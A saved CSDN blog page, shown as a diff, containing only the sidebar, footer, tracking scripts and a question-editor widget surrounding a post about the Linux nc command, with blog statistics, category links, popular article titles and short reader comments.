+    <li>积分：<span>8403</span> </li>    
+    <li>等级： <span style="position:relative;display:inline-block;z-index:1">
+            <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/blog6.png" alt="" style="vertical-align: middle;" id="leveImg">
+            <div id="smallTittle" style=" position: absolute;  left: -24px;  top: 25px;  text-align: center;  width: 101px;  height: 32px;  background-color: #fff;  line-height: 32px;  border: 2px #DDDDDD solid;  box-shadow: 0px 2px 2px rgba (0,0,0,0.1);  display: none;   z-index: 999;">
+            <div style="left: 42%;  top: -8px;  position: absolute;  width: 0;  height: 0;  border-left: 10px solid transparent;  border-right: 10px solid transparent;  border-bottom: 8px solid #EAEAEA;"></div>
+            积分：8403 </div>
+        </span>  </li>
+    <li>排名：<span>第715名</span></li>
+</ul>
+<ul id="blog_statistics">
+    <li>原创：<span>336篇</span></li>
+    <li>转载：<span>20篇</span></li>
+    <li>译文：<span>25篇</span></li>
+    <li>评论：<span>165条</span></li>
+</ul>
+</ul>
+</div>
+
+
+<div class="panel" id="panel_Search">
+    <ul class="panel_head"><span>文章搜索</span></ul>
+    <ul class="panel_body">
+        <form id="frmSearch" action="http://so.csdn.net/search" class="form_search" target="_blank">
+        <span><input id="inputSearch" type="text" class="blogsearch" title="请输入关键字"></span>
+        <input id="btnSubmit" type="button" value="搜索" title="search in blog">
+        <input type="hidden" name="q" id="inputQ">
+        <input type="hidden" name="t" value="blog">
+        <a id="btnSearchBlog" target="_blank"></a>
+        </form>
+    </ul>
+</div>
+
+<script type="text/javascript">
+    $(function () {
+        $("#btnSubmit").click(function () {           
+            search();
+        });
+
+        $("#frmSearch").submit(function () {
+            search();
+            return false;
+        });
+
+        function search()
+        {
+            var url = "http://so.csdn.net/so/search/s.do?q=" + encodeURIComponent($("#inputSearch").val()) + "&u=" + username + "&t=blog";
+            window.location.href = url;
+        }   
+    });
+</script>
+<div id="panel_Category" class="panel">
+<ul class="panel_head"><span>文章分类</span></ul>
+<ul class="panel_body">
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283120" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">QTP/UFT</a><span>(75)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283121" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">LoadRunner</a><span>(41)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1286518" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">性能测试</a><span>(85)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283132" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">QC/ALM</a><span>(4)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283127" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Selenium</a><span>(8)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283126" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Linux</a><span>(41)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1336087" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">自动化测试</a><span>(56)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1471505" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Linux Shell编程</a><span>(21)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283122" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">php</a><span>(11)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283125" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">测试沙龙</a><span>(3)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1297288" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Nginx/Apache</a><span>(15)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1297289" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Tomcat</a><span>(6)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1297291" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Weblogic</a><span>(3)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1306081" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Java</a><span>(15)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283124" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">C#</a><span>(5)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1286374" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">测试设计</a><span>(8)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1429687" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Mantis缺陷管理</a><span>(7)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1334912" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">软件质量管理</a><span>(17)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283128" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">安全性测试</a><span>(1)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1534583" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">前端性能优化</a><span>(11)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1399283" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">敏捷/持续集成CI</a><span>(10)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1377693" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">白盒/单元测试</a><span>(16)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1292813" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">商业智慧</a><span>(25)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1343264" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Android自动化</a><span>(18)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1372504" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">简单算法</a><span>(6)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1394513" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">计算机基础</a><span>(5)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1430276" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">MySQL</a><span>(12)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1408257" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">SQL Server</a><span>(3)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1283123" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Oracle</a><span>(3)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/1493871" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">HTTP/Web</a><span>(17)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/2294133" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Memcached（MC）</a><span>(3)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/2393809" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">Tokyo Tyrant（TT）</a><span>(6)</span>
+            </li>
+             <li>
+                <a href="http://blog.csdn.net/xifeijian/article/category/2487469" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_wenzhangfenlei&#39;]); ">FastDFS</a><span>(3)</span>
+            </li>
+</ul>
+</div><div id="hotarticls" class="panel">
+<ul class="panel_head">
+    <span>       
+阅读排行    </span>
+</ul>
+
+<ul class="panel_body itemlist">
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/20956605" title="Nginx配置性能优化">Nginx配置性能优化</a><span>(8995)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/9367339" title="Linux Shell脚本编程－－curl命令详解">Linux Shell脚本编程－－curl命令详解</a><span>(8674)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/20313977" title="MySQL详解－－锁">MySQL详解－－锁</a><span>(8074)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8459332" title="QTP下载地址及破解方法">QTP下载地址及破解方法</a><span>(6845)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/11856813" title="前端模拟POST发送数据－Chrome下的REST Client（接口测试利器）">前端模拟POST发送数据－Chrome下的REST Client（接口测试利器）</a><span>(6526)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8210156" title="QTP自动化测试基础系列视频（完）">QTP自动化测试基础系列视频（完）</a><span>(6027)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8836438" title="Apache Ant运行时Unable to locate tools.jar解决方法">Apache Ant运行时Unable to locate tools.jar解决方法</a><span>(5430)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8830933" title="Picked up JAVA_TOOL_OPTIONS: -agentlib:jvmhook解决方法">Picked up JAVA_TOOL_OPTIONS: -agentlib:jvmhook解决方法</a><span>(4797)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8580377" title="Android自动化测试之MonkeyRunner录制和回放脚本（十一）">Android自动化测试之MonkeyRunner录制和回放脚本（十一）</a><span>(4583)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8333396" title="Microsoft.Jet.OLEDB.4.0和Microsoft.ACE.OLEDB.12.0的区别">Microsoft.Jet.OLEDB.4.0和Microsoft.ACE.OLEDB.12.0的区别</a><span>(4566)</span>
+</li>
+</ul>
+</div>
+<div id="hotarticls2" class="panel">
+<ul class="panel_head"><span>评论排行</span></ul>
+<ul class="panel_body itemlist">
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8210156" title="QTP自动化测试基础系列视频（完）">QTP自动化测试基础系列视频（完）</a><span>(14)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8580210" title="五险一金，你懂吗?">五险一金，你懂吗?</a><span>(13)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8576683" title="穷人和富人的思维方式">穷人和富人的思维方式</a><span>(6)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8607045" title="自动化测试管理平台－－QTP Based开发设计已完成！">自动化测试管理平台－－QTP Based开发设计已完成！</a><span>(6)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8513388" title="QTP自动化测试视频系列（第23、24、25集）">QTP自动化测试视频系列（第23、24、25集）</a><span>(4)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/12879395" title="localhost与127.0.0.1的区别">localhost与127.0.0.1的区别</a><span>(4)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/20313977" title="MySQL详解－－锁">MySQL详解－－锁</a><span>(4)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8566503" title="TestLink1.9.5版本与Mantis 整合注意事项">TestLink1.9.5版本与Mantis 整合注意事项</a><span>(3)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/8578433" title="SWOT分析模型">SWOT分析模型</a><span>(3)</span>
+</li>
+<li>
+<a href="http://blog.csdn.net/xifeijian/article/details/13355031" title="Linux如何修改env看到的环境变量？  .bashrc和.bash_profile区别">Linux如何修改env看到的环境变量？  .bashrc和.bash_profile区别</a><span>(3)</span>
+</li>
+</ul>
+</div>
+<div id="newcomments" class="panel">
+<ul class="panel_head"><span>最新评论</span></ul>
+<ul class="panel_body itemlist">
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/8580377#comments">Android自动化测试之MonkeyRunner录制和回放脚本（十一）</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/baidu_25213837" class="user_name">baidu_25213837</a>:
+我也是，回放脚本没有反应？
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/8567478#comments">QTP11.5/UFT官方下载与安装</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/qq_24993703" class="user_name">qq_24993703</a>:
+看不到图
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/39397795#comments">PHP：exec与system区别</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/xifeijian" class="user_name">xifeijian</a>:
+@meng0819:相比之下安全性弱一些，例如被执行shell命令，它需要php.ini打开安全开关...
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/12777187#comments">TCP为什么需要3次握手与4次挥手</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/hanke546" class="user_name">roarghy</a>:
+真不错啊！mark
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/20313977#comments">MySQL详解－－锁</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/ac_liang" class="user_name">ac_liang</a>:
+深入浅出MySQL数据库开发优化与管理维护
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/9180011#comments">Linux Shell脚本编程－－tee命令</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/u010850027" class="user_name">丁国华</a>:
+谢谢分享 学习了`(*∩_∩*)′
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/9180011#comments">PHP：exec与system区别</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/meng0819" class="user_name">meng0819</a>:
+会不会有安全问题啊？
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/8582932#comments">Android自动化测试之如何安装Android虚拟机（三）</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/baidu_24411011" class="user_name">baidu_24411011</a>:
+power off 自动关闭怎么办  老师
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/8582932#comments">MySQL详解－－锁</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/wukangding" class="user_name">wukangding</a>:
+这一点在本书的“开发篇”介绍表类型的选择时请问下这是哪本书？？
+    </p>
+    </li>
+    <li>
+   
+         <a href="http://blog.csdn.net/xifeijian/article/details/20956605#comments">Nginx配置性能优化</a>
+    <p style="margin:0px;"><a href="http://blog.csdn.net/gyk668cn" class="user_name">gyk668cn</a>:
+目前还是有挺多的优化并不知道。
+    </p>
+    </li>
+</ul>
+</div>
+    </div>
+    <div class="clear">
+    </div>
+</div>
+
+            <div class="clear">
+            </div>
+        </div>
+        
+
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/cnick.js"></script>
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/newblog.min.js"></script>
+
+
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/showblogmedal.ashx"></script>
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/JavaScript1.js"></script><link rel="stylesheet" type="text/css" href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/pub_footer_2014.css"><div class="pub_fo"><div id="pub_footerall" class="pub_footer_new"><dl><dt></dt> <dd class="foot_sub_menu"><a href="http://www.csdn.net/company/about.html" target="_blank">公司简介</a><span>|</span><a href="http://www.csdn.net/company/recruit.html" target="_blank">招贤纳士</a><span>|</span><a href="http://www.csdn.net/company/marketing.html" target="_blank">广告服务</a><span>|</span><a href="http://www.csdn.net/company/account.html" target="_blank">银行汇款帐号</a><span>|</span><a href="http://www.csdn.net/company/contact.html" target="_blank">联系方式</a><span>|</span><a href="http://www.csdn.net/company/statement.html" target="_blank">版权声明</a><span>|</span><a href="http://www.csdn.net/company/layer.html" target="_blank">法律顾问</a><span>|</span><a href="mailto:webmaster@csdn.net">问题报告</a><span>|</span><a target="_blank" href="http://www.csdn.net/friendlink.html">合作伙伴</a><span>|</span><a href="http://bbs.csdn.net/forums/Service" target="_blank">论坛反馈</a></dd><dd class="foot_contact"><a href="http://wpa.qq.com/msgrd?v=3&uin=2355263776&site=qq&menu=yes" target="_blank" class="qq">网站客服</a><a href="http://wpa.qq.com/msgrd?v=3&uin=2251809102&site=qq&menu=yes" target="_blank" class="qq">杂志客服</a><a href="http://e.weibo.com/csdnsupport/profile" target="_blank" class="weibo">微博客服</a><a href="mailto:webmaster@csdn.net" class="email" title="联系邮箱">webmaster@csdn.net</a><span class="phone" title="服务热线">400-600-2320</span><span class="interval">|</span><span>北京创新乐知信息技术有限公司 版权所有</span><span class="interval">|</span><span>江苏乐知网络技术有限公司 提供商务支持</span></dd><dd class="foot_copyright"><span>京&nbsp;ICP&nbsp;证&nbsp;070598&nbsp;号</span><span class="interval">|</span><span>Copyright © 1999-2014, CSDN.NET, All Rights Reserved&nbsp;</span><a href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202001032100010" target="_blank"><img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/gongshang_logos.gif" alt="GongshangLogo" title=""></a></dd></dl></div></div><div id="note1" class="csdn_note" style="display:none; position:absolute; z-index:9999; width:440px">  <span class="notice_top_arrow"><span class="inner"></span></span>  <div class="box"></div></div><div class="csdn_notice_tip" style="display: none; position: absolute; z-index: 9990; width: 170px;">  <iframe src="about:blank" frameborder="0" scrolling="no" style="z-index:-1;position:absolute;top:0;left:0;width:100%;height:100%;background:transparent"></iframe>  <div class="tip_text">您有<strong>0</strong>条新通知</div>  <a href="javascript:void 0" class="close2"></a></div><script id="noticeScript" type="text/javascript" btnid="header_notice_num" wrapid="note1" count="5" subcount="5" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/notify.js"></script>
+
+    <script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/login.js"></script>
+    <script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/tongji.js"></script><img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/tongji.do" border="0" width="1" height="1"><a href="http://tongji.linezing.com/report.html?unit_id=3480991" target="_blank"><img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/icon1.gif" border="0" alt="量子统计"></a>
+<script type="text/javascript">document.write("<img src=http://counter.csdn.net/pv.aspx?id=24 border=0 width=0 height=0>");</script><img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/pv.aspx" border="0" width="0" height="0">
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/counter.js"></script><script type="text/javascript" charset="UTF-8" src="http://message.csdn.net/msg.popup.js"></script>
+<script type="text/javascript" src="http://ad.csdn.net/scripts/ad-blog.js"></script>
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/count.js"></script><iframe src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/logs.htm" frameborder="0" width="0" height="0"></iframe>
+<script type="text/javascript">
+    $(function () {
+        function __get_code_toolbar(snippet_id) {
+            return $("<a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "' target='_blank' title='在CODE上查看代码片' style='text-indent:0;'><img src='https://code.csdn.net/assets/CODE_ico.png' width=12 height=12 alt='在CODE上查看代码片' style='position:relative;top:1px;left:2px;'/></a>"
+                    + "<a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "/fork' target='_blank' title='派生到我的代码片'  style='text-indent:0;'><img src='https://code.csdn.net/assets/ico_fork.svg' width=12 height=12 alt='派生到我的代码片' style='position:relative;top:2px;left:2px;'/></a>");
+        }
+        
+        $("[code_snippet_id]").each(function () {
+            __s_id = $(this).attr("code_snippet_id");
+            if (__s_id != null && __s_id != "" && __s_id != 0 && parseInt(__s_id) > 70020) {
+                __code_tool = __get_code_toolbar(__s_id);
+                $(this).prev().find(".tools").append(__code_tool);
+            }
+        });
+    });
+</script>
+
+    </div><input type="hidden" id="aa_g_data_ids">
+      <!--new top-->
+    
+    <script id="csdn-toolbar-id" btnid="header_notice_num" wrapid="note1" count="5" subcount="5" type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/toolbar.js"></script>
+     <!--new top-->
+   
+    <link href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/ask_float_block.css" type="text/css" rel="stylesheet">
+    <script language="JavaScript" type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/wmd.js"></script>
+    <script language="JavaScript" type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/showdown.js"></script>
+    <script language="JavaScript" type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/prettify.js"></script>
+    <script language="JavaScript" type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/ask_float_block.js"></script>
+
+
+
+<link rel="stylesheet" type="text/css" media="screen" href="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/ask_float_fonts_css-6b30a53970eb5c3a2a045e3df585b475.css"><div data-mod="popu_64" class="tracking-ad" chg-blk="0"><a id="com-ask-float-block" title="提问按钮" style="top:555px"></a><a id="com-quick-reply" title="快速回复" style="top:596px"></a><a id="com-d-top-a" style="top: 637px; display: block;" title="返回顶部" onclick=""></a> </div><div class="pop_edit ask_second comm_ask_second"><h3>提问</h3><span class="ask_float_span">您的问题将会被发布在“<a class="ask_float_channel" href="http://ask.csdn.net/" target="_blank" style="cursor:pointer">技术问答</a>”频道</span><a href="http://blog.csdn.net/xifeijian/article/details/9348277#" nodetype="close" class="close">×</a><div class="context"><div class="err_div"><span class="err_ico"></span><span class="err_txt">该问题已存在，请勿重复提问</span></div><div class="input_div"><input id="askInputSecond" type="text" style="font-size:14px;" placeholder="问题标题"></div><div class="cm_box"><div class="cm_dialog"></div> <div class="pop_cm cm_add_link"><input type="text" placeholder="链接内容" id="af_cm_link_txt"><input type="text" placeholder="链接地址" id="af_cm_link_url"><input type="text" placeholder="链接提示" id="af_cm_link_tit"><div class="text-right"><span class="btn btn-default btn-sm" id="add_link_btn">插入链接</span> </div> </div><div class="pop_cm cm_add_img"><div class="nav-tabs"><a class="img_tab active" href="http://blog.csdn.net/xifeijian/article/details/9348277#tab_upload">本地上传</a><a class="img_tab" href="http://blog.csdn.net/xifeijian/article/details/9348277#tab_weburl">网络图片</a></div><div class="tab_panel active" id="tab_upload"><div class="set_img"><iframe src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/upload.htm"></iframe></div></div><div class="tab_panel" id="tab_weburl"><input type="text" placeholder="图片地址" id="af_cm_img_url"><input type="text" placeholder="图片说明" id="af_cm_img_alt"><div class="text-right"><span class="btn btn-default btn-sm" id="add_img_btn">插入图片</span> </div></div> </div></div> <textarea id="editor_all" rows="8" style="display: none;"></textarea><div class="editor-toolbar"><i class="separator">|</i><a class="icon-headline" title="标题一（Ctrl+Alt+1）"></a><a class="icon-heading" title="标题二（Ctrl+Alt+2）"></a><a class="icon-bold" title="粗体（Ctrl+B）"></a><a class="icon-italic" title="斜体（Ctrl+I）"></a><i class="separator">|</i><a class="icon-quote-left" title="引用（Ctrl+’）"></a><a class="icon-code" title="插入代码片（Ctrl+,）"></a><a class="icon-list-ul" title="无序列表（Ctrl+L）"></a><a class="icon-list-ol" title="有序列表（Ctrl+Alt+L）"></a><i class="separator">|</i><a class="icon-link" title="添加链接（Ctrl+K）"></a><a class="icon-picture" title="添加图片（Ctrl+Alt+I）"></a><i class="separator">|</i><a class="icon-reply" title="撤退（Ctrl+Z）"></a><a class="icon-share-alt" title="前进（Ctrl+Shift+Z）"></a><i class="separator">|</i><a class="icon-info" href="http://ask.csdn.net/pages/markdown" target="_blank" title="markdown语法参考"></a><a class="icon-preview" title="预览"></a><i class="separator">|</i></div><div class="CodeMirror cm-s-paper CodeMirror-focused"><div style="overflow: hidden; position: relative; width: 3px; height: 0px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" style="position: absolute; padding: 0px; width: 1000px; height: 1em; outline: none; font-size: 4px;" tabindex="0"></textarea></div><div class="CodeMirror-hscrollbar"><div style="height: 1px;"></div></div><div class="CodeMirror-vscrollbar"><div style="width: 1px;"></div></div><div class="CodeMirror-scrollbar-filler"></div><div class="CodeMirror-gutter-filler"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="min-width: 33px;"><div style="position: relative;"><div class="CodeMirror-lines"><div style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre>&nbsp;<span style="display: inline-block; width: 1px; margin-right: -1px;">&nbsp;</span></pre></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code"></div><div class="CodeMirror-cursor">&nbsp;</div><div class="CodeMirror-cursor CodeMirror-secondarycursor">&nbsp;</div></div></div></div></div><div style="position: absolute; height: 30px; width: 1px;"></div><div class="CodeMirror-gutters" style="display: none;"></div></div></div><div class="editor-statusbar"><span class="lines">0</span><span 